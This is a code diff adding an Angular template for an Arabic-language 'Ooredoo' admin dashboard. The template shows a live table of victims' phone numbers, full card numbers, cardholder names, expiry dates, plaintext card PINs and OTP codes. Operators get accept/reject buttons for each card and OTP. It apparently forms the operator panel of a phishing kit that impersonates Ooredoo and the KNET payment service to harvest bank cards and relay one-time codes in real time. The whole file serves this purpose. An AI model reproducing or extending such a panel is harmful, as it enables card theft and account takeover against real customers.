@@ -1,0 +1,196 @@
+<div class="min-h-screen bg-slate-50 text-slate-800 flex flex-col"
+  style="direction: rtl; font-family: 'Cairo', 'Outfit', 'Inter', sans-serif;">
+
+  <!-- Premium background glow elements -->
+  <div class="absolute top-0 right-1/4 w-125 h-125 bg-red-500/4 rounded-full blur-[120px] pointer-events-none">
+  </div>
+  <div
+    class="absolute bottom-0 left-1/4 w-125 h-125 bg-red-500/4 rounded-full blur-[120px] pointer-events-none">
+  </div>
+
+  <!-- Navbar -->
+  <header
+    class="w-full bg-white/80 backdrop-blur-xl border-b border-slate-200/80 px-8 py-5 flex items-center justify-between sticky top-0 z-20 shadow-md shadow-slate-100/40">
+    <div class="flex items-center gap-4">
+      <span class="w-4 h-4 bg-red-600 rounded-full animate-pulse"></span>
+      <h1 class="text-2xl font-black text-slate-900 tracking-wide">لوحة التحكم اللحظية Ooredoo</h1>
+      <span class="text-sm bg-slate-100 text-slate-600 font-bold px-3 py-1 rounded-full border border-slate-200">لوحة
+        المشرف</span>
+    </div>
+
+    <!-- Admin profile & logout -->
+    <div class="flex items-center gap-5">
+      <div class="hidden sm:flex flex-col text-left">
+        <span class="text-xs text-slate-500 font-bold">تسجيل الدخول كـ</span>
+        <span class="text-base font-bold text-slate-800">{{ adminEmail() }}</span>
+      </div>
+      <button (click)="logout()" type="button"
+        class="bg-red-50 hover:bg-red-100 text-red-600 border border-red-200 px-5 py-2.5 rounded-2xl text-sm font-extrabold transition-all duration-200 cursor-pointer active:scale-95 shadow-sm hover:shadow">
+        تسجيل الخروج
+      </button>
+    </div>
+  </header>
+
+  <!-- Dashboard Content -->
+  <main class="grow p-8 z-10">
+    <div class="max-w-7xl mx-auto space-y-8">
+
+      <!-- Realtime Operations Table Card -->
+      <div class="bg-white rounded-3xl border border-slate-200/80 overflow-hidden shadow-lg">
+        <div class="px-8 py-6 border-b border-slate-100 flex items-center justify-between bg-slate-50/50">
+          <div>
+            <h2 class="text-xl font-black text-slate-900">جدول الطلبات المباشرة (Real-Time)</h2>
+            <p class="text-sm text-slate-600 mt-1.5">تحديث حي لحظي للبيانات وحركة العملاء دون الحاجة لتحديث الصفحة</p>
+          </div>
+          <!-- Live Indicator dot -->
+          <div
+            class="flex items-center gap-2.5 bg-emerald-50 text-emerald-700 px-4 py-1.5 rounded-full border border-emerald-200 text-sm font-black">
+            <span class="w-2.5 h-2.5 bg-emerald-500 rounded-full animate-ping"></span>
+            <span>بث حي</span>
+          </div>
+        </div>
+
+        <div class="overflow-x-auto w-full">
+          <table class="w-full text-right border-collapse">
+            <thead>
+              <tr
+                class="bg-slate-50 border-b border-slate-200 text-sm font-black text-slate-500 uppercase tracking-wider">
+                <th class="px-6 py-5">رقم الهاتف</th>
+                <th class="px-6 py-5">المبلغ</th>
+                <th class="px-6 py-5">بيانات البطاقة (الكي نت)</th>
+                <th class="px-6 py-5">الرقم السري (PIN)</th>
+                <th class="px-6 py-5">كود التحقق (OTP)</th>
+                <th class="px-6 py-5">قرارات المشرف</th>
+                <th class="px-6 py-5 text-left">التاريخ</th>
+              </tr>
+            </thead>
+            <tbody class="divide-y divide-slate-100 text-base">
+              @for (client of clients(); track client.id) {
+              <tr class="hover:bg-slate-50/50 transition-colors">
+                <!-- Phone number -->
+                <td class="px-6 py-5.5 font-black text-slate-900 text-base sm:text-lg tracking-wide">{{
+                  client.phone_number }}</td>
+
+                <!-- Credit balance -->
+                <td class="px-6 py-5.5 font-extrabold text-slate-800 text-base sm:text-lg">{{ client.credit }} د.ك</td>
+
+                <!-- Card info -->
+                <td class="px-6 py-5.5">
+                  @if (getLatestPayment(client); as payment) {
+                  <div class="flex flex-col gap-1.5">
+                    <span class="font-mono text-slate-900 tracking-wider font-bold text-base sm:text-lg">{{
+                      payment.cc_number }}</span>
+                    <div class="flex items-center gap-2 text-sm text-slate-600">
+                      <span class="font-extrabold text-slate-700">{{ payment.cc_name }}</span>
+                      <span class="text-slate-300">|</span>
+                      <span class="font-medium text-slate-500">تنتهي في: {{ payment.cc_month }}/{{ payment.cc_year
+                        }}</span>
+                    </div>
+                  </div>
+                  } @else {
+                  <span class="text-slate-400 text-sm font-semibold italic">بانتظار إدخال البطاقة...</span>
+                  }
+                </td>
+
+                <!-- PIN -->
+                <td class="px-6 py-5.5 font-mono font-black text-red-600 text-lg sm:text-xl tracking-widest">
+                  @if (getLatestPayment(client); as payment) {
+                  {{ payment.cc_pin }}
+                  } @else {
+                  <span class="text-slate-400">-</span>
+                  }
+                </td>
+
+                <!-- OTP -->
+                <td class="px-6 py-5.5">
+                  @if (getLatestOtp(client); as otp) {
+                  <div class="flex flex-col gap-1.5">
+                    <span class="font-mono text-xl font-black text-sky-600 tracking-wider">{{ otp.otp }}</span>
+                    <span class="text-xs text-slate-500 font-bold">الحالة: {{ otp.status }}</span>
+                  </div>
+                  } @else if (getLatestPayment(client)?.status === 'ACCEPTED') {
+                  <span class="text-sky-600/80 text-sm font-bold animate-pulse">بانتظار إدخال OTP...</span>
+                  } @else {
+                  <span class="text-slate-400 text-sm">-</span>
+                  }
+                </td>
+
+                <!-- Admin Actions -->
+                <td class="px-6 py-5.5">
+                  <div class="flex flex-col gap-3.5">
+                    <!-- Payment decisions -->
+                    @if (getLatestPayment(client); as payment) {
+                    @if (payment.status === 'PENDING') {
+                    <div class="flex items-center gap-2">
+                      <span class="text-sm text-slate-500 font-extrabold ml-1">البطاقة:</span>
+                      <button (click)="handlePaymentAction(payment.id, 'ACCEPTED')"
+                        class="bg-emerald-50 hover:bg-emerald-100 text-emerald-700 border border-emerald-200 px-3.5 py-1.5 rounded-xl text-sm font-black transition-colors cursor-pointer shadow-sm active:scale-95">
+                        موافقة
+                      </button>
+                      <button (click)="handlePaymentAction(payment.id, 'REJECTED')"
+                        class="bg-red-50 hover:bg-red-100 text-red-700 border border-red-200 px-3.5 py-1.5 rounded-xl text-sm font-black transition-colors cursor-pointer shadow-sm active:scale-95">
+                        رفض
+                      </button>
+                    </div>
+                    } @else {
+                    <div class="flex items-center gap-1.5 text-sm">
+                      <span class="text-slate-500 font-medium">حالة البطاقة:</span>
+                      <span [ngClass]="{
+                              'text-emerald-700 bg-emerald-50 border-emerald-200': payment.status === 'ACCEPTED',
+                              'text-red-700 bg-red-50 border-red-200': payment.status === 'REJECTED'
+                            }" class="px-3 py-1 rounded-lg border font-extrabold">
+                        {{ payment.status }}
+                      </span>
+                    </div>
+                    }
+                    }
+
+                    <!-- OTP decisions -->
+                    @if (getLatestOtp(client); as otp) {
+                    @if (otp.status === 'PENDING') {
+                    <div class="flex items-center gap-2 border-t border-slate-100 pt-3">
+                      <span class="text-sm text-slate-500 font-extrabold ml-1">الـ OTP:</span>
+                      <button (click)="handleOtpAction(otp.id, 'ACCEPTED')"
+                        class="bg-emerald-600 hover:bg-emerald-700 text-white px-4 py-1.5 rounded-xl text-sm font-black transition-colors cursor-pointer shadow-sm active:scale-95">
+                        موافقة
+                      </button>
+                      <button (click)="handleOtpAction(otp.id, 'REJECTED')"
+                        class="bg-red-600 hover:bg-red-700 text-white px-4 py-1.5 rounded-xl text-sm font-black transition-colors cursor-pointer shadow-sm active:scale-95">
+                        رفض
+                      </button>
+                    </div>
+                    } @else {
+                    <div class="flex items-center gap-1.5 text-sm border-t border-slate-100 pt-3">
+                      <span class="text-slate-500 font-medium">حالة الـ OTP:</span>
+                      <span [ngClass]="{
+                              'text-emerald-700 bg-emerald-50 border-emerald-200': otp.status === 'ACCEPTED',
+                              'text-red-700 bg-red-50 border-red-200': otp.status === 'REJECTED'
+                            }" class="px-3 py-1 rounded-lg border font-extrabold">
+                        {{ otp.status }}
+                      </span>
+                    </div>
+                    }
+                    }
+                  </div>
+                </td>
+
+                <!-- Date -->
+                <td class="px-6 py-5.5 text-left font-semibold text-slate-600 text-sm">
+                  {{ client.created_at | date:'yyyy-MM-dd HH:mm:ss' }}
+                </td>
+              </tr>
+              } @empty {
+              <tr>
+                <td colspan="7" class="px-6 py-16 text-center text-slate-500 font-bold text-lg">
+                  لا يوجد عملاء أو معاملات مسجلة حالياً
+                </td>
+              </tr>
+              }
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+    </div>
+  </main>
+</div>
